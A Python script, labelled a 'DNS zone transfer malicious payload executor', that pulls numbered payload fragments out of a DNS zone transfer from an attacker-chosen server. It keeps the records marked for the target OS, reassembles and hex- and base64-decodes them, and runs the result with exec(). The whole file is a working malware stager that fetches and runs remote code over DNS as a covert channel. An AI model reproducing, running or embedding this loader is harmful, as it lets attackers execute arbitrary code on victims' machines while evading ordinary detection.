#!/usr/bin/env python3

import sys
import argparse

import dns.query
import dns.zone
import base64

parser = argparse.ArgumentParser(description='DNS zone transfer malicious payload executor')
parser.add_argument('-o', '--os', type=str, required=True, help='operating system (linux or windows)')
parser.add_argument('-d', '--domain-name', type=str, required=True, help='domain name which should be transfer')
parser.add_argument('-s', '--server-address', type=str, required=True, help='DNS server address, from which zone should be transfer')
args = parser.parse_args()

ips = {
    'linux': '127.0.0.1',
    'windows': '127.0.0.2'
}
ip = ips.get(args.os, ips['linux'])
payloads_dict = {}

z = dns.zone.from_xfr(dns.query.xfr(args.server_address, args.domain_name))
for name, value in z.items():
    try:
        hostname, _, _, _, host_ip = value.to_text(name).split(" ")
        if host_ip != ip:
            continue
    except ValueError:
        continue
    
    number, payload = hostname.split('.')
    payloads_dict[int(number)] = payload

payloads = [None] * len(payloads_dict)

for number, value in payloads_dict.items():
    payloads[number] = value

payload = ''.join(payloads)
exec(base64.b64decode(bytes.fromhex(payload)))